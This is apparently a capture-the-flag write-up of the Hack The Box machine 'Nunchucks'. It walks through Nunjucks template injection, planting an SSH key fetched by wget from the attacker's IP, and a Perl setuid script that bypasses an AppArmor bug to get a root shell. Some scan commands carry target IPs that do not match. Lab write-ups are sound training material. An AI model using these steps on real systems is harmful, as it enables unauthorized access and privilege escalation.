---
title: Nunchucks
published: true
layout: post
---

<br />

---------------
Nunchucks is a easy machine that explores a NodeJS-based Server Side Template Injection (SSTI) leading to an AppArmor bug which disregards the binary's AppArmor profile while executing scripts that include the shebang of the profiled application. 
<br />

<iframe style="aspect-ratio: 16 / 9; width: 65%; display: block; margin: auto;" src="https://www.youtube.com/embed/1JX_bPG7aBs?si=qDavXCF4grxA5Fij" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

<br />

---------------------------------------------------
<br />

## Walkthrough

### Reconnaissance

We will start by **scanning protocolos** in the target machine, this can be divided in 3 phases:
1. Scan for **open ports**.
2. Scan for **services** in these open ports.
3. Scan for **vulnerabilities** in these services.

<br />

Let's start by scanning for **open ports**:

```bash
sudo nmap -sS 10.10.11.122 -p- -T4 --min-rate 5000 -oN all_tcp_ports.txt --open -n -Pn -vv
sudo nmap -sU 10.10.11.122 -p- -T4 --min-rate 5000 -oN all_udp_ports.txt --open -n -Pn -vv
```
<br />

There are **3 open ports**:
+ **22/tcp**
+ **80/tcp**
+ **443/tcp**

<br />

Let's check which **services** are running in these ports:

```bash
sudo nmap -sS 10.10.10.11 -p 22,80,443 -T4 --min-rate 5000 -oX open_tcp_ports.xml -oN open_tcp_ports.txt --version-all -n -Pn -A
```
<br />

These services are**:
+ **22/tcp OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)**
+ **80/tcp nginx 1.18.0 ((Ubuntu))**
+ **443/tcp nginx 1.18.0 ((Ubuntu))**

<br />

We also find out a **hostname**, so let's add it:

```bash
echo "10.10.11.122 nunchucks.htb" | sudo tee --append /etc/hosts
```
<br />

Now we will seek for **vulnerabilities**:

```bash
sudo nmap -sS 10.10.10.29 -p 22,80,443 -T4 --min-rate 5000 --script="vuln or intrusive or discovery" -oN tcp_vulns.txt -oX tcp_vulns.xml -n -Pn
```
<br />

These scans didn't return any relevant information.
<br />

------
<br />
### Foothold

At first we found a website that didn't lead us to anything, so I started performing some enumeration:

```bash
gobuster vhost -u https://nunchucks.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o gobuster_subdomains_443.txt -t 25 --append-domain -r -k
```

![](/assets/Nunchucks/1.png)
<br />
<br />

There is a **subdomain**, let's add it to our **/etc/hosts** file and navigate this website:<br />
![](/assets/Nunchucks/2.png)
<br />
<br />

This website don't reveal much information, but has an **email field** that **return us our input**, so we can try to leverage it, to my mind came XSS, SSTI or maybe SSRF. XSS wouldn't lead to anything, there is an specific cookie to prevent request forgery attacks, so there's only one possibility, so let's test for it using this cheatsheet:<br />
![](/assets/Nunchucks/3.png)
<br />
<br />

However, there are **client-side protections**, but we can use **BurpSuite** to bypass them:<br />
![](/assets/Nunchucks/4.png)
<br />
<br />

Great!!! We can clearly see that is vulnerable, let's try to **narrow down the scope**:<br />
![](/assets/Nunchucks/5.png)
<br />
<br />

Great!! So it may be **Jinja2** or **Twig**, however, to be sure I used this [website](https://cheatsheet.hackmanit.de/template-injection-table/):<br />
![](/assets/Nunchucks/6.png)
<br />
<br />

However, **no template engine matches the criteria**, so I continued enumerating until I find that the website is using **Express framework**:<br />
![](/assets/Nunchucks/7.png)
<br />
<br />

Reviewing its **documentation**, there is a **template engin**e that nearly matches our machine name:<br />
![](/assets/Nunchucks/8.png)
<br />
<br />

Searching for **SSTI exploits** for **Nunjucks engine** I found this one:<br />
![](/assets/Nunchucks/9.png)
<br />
<br />

Let's try this exploit:<br />
![](/assets/Nunchucks/10.png)
<br />
<br />

It worked!!! Now, to get a shell on the machine, I uploaded an **authorized_keys file** to the machine with my **public key**, these are the command:

```bash
mkdir /home/david/.ssh
wget http://10.10.16.7/authorized_keys -O /home/david/.ssh/authorized_keys
chmod 700 /home/david/.ssh
chmod 640 /home/david/.ssh/authorized_keys
```
<br />

Now we can use SSH to connect to the machine:

```bash
ssh david@nunchucks.htb
cat user.txt
```

![](/assets/Nunchucks/11.png)
<br />
<br />

------
<br />
### Privilege Escalation

Enumerating the machine I found that **capabilities** are enabled for the **perl executable**:

```bash
getcap -r / 2>/dev/null
```

![](/assets/Nunchucks/12.png)
<br />
<br />

However, trying to leverage this capability didn't work:

```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```
<br />

This might indicate that **AppArmor** is preventing us from leveraging this capability, we can confirm this by listing the **AppArmor rules directory**:

```bash
ls -l /etc/apparmor.d
```

![](/assets/Nunchucks/13.png)
<br />
<br />

There is a configuration file for the perl executable, let's see what it does:<br />
![](/assets/Nunchucks/14.png)
<br />
<br />

This file grants the **SETUID capability**, denies access to anything under **/root/** and to the **/etc/shadow file**, also limits the use of this capability to the **executables listed** there. However, there is a [bug](https://bugs.launchpad.net/apparmor/+bug/1911431) in AppArmor that can be used to bypass these limitations, it's as simple as creating a **perl script**, but **instead of calling it using the executable**, just execute the file, which should contain a **shebang**:

```perl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);

system("/bin/bash")
```
<br />

Now just execute the file:

```bash
chmod +x privesc.pl
./privesc.pl
```

![](/assets/Nunchucks/15.png)
<br />
<br />
